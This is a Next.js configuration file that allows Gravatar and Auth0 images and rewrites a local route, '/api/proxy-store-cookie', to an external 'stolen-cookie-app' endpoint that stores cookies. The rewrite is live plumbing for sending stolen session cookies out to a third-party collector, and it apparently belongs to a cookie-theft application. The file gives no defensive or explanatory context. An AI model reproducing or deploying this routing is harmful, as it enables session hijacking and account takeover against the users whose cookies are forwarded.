import type { NextConfig } from "next";

const nextConfig: NextConfig = {
  images: {
    domains: ["s.gravatar.com", "cdn.auth0.com"],
  },
  async rewrites() {
    return [
      {
        source: "/api/proxy-store-cookie",
        destination: "https://stolen-cookie-app.vercel.app/api/store-cookie",
      },
    ];
  },
};

export default nextConfig;
